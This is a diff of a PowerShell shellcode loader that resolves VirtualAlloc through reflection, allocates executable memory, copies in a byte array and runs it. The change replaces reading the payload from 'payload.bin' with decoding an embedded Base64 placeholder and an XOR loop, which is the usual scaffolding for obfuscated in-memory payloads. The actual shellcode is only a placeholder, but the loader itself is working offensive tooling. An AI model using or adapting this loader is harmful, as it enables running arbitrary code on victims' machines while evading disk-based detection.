@@ -1,4 +1,5 @@
-﻿Set-StrictMode -Version 2
+
+Set-StrictMode -Version 2
 
 function func_get_delegate_type_new {
     Param (
@@ -19,12 +20,15 @@ function func_get_proc_address_new {
     return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods_news.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
 }
 
-If ([IntPtr]::size -eq 8) {
-    [Byte[]]$acode = [System.IO.File]::ReadAllBytes('payload.bin')
-    $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address_new kernel32.dll VirtualAlloc), (func_get_delegate_type_new @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
-    $var_buffer = $var_va.Invoke([IntPtr]::Zero, $acode.Length, 0x3000, 0x40)
-    [System.Runtime.InteropServices.Marshal]::Copy($acode, 0, $var_buffer, $acode.length)
-    $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type_new @([IntPtr]) ([Void])))
-    $var_runme.Invoke([IntPtr]::Zero)
 
+If ([IntPtr]::size -eq 8) {
+	[Byte[]]$acode=[System.Convert]::FromBase64String('base64')
+	for ($x = 0; $x -lt $acode.Count; $x++) {
+		$acode[$x] = $acode[$x] -bxor 0
+	}
+	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address_new kernel32.dll VirtualAlloc), (func_get_delegate_type_new @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
+	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $acode.Length, 0x3000, 0x40)
+	[System.Runtime.InteropServices.Marshal]::Copy($acode, 0, $var_buffer, $acode.length)
+	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type_new @([IntPtr]) ([Void])))
+	$var_runme.Invoke([IntPtr]::Zero)
 }
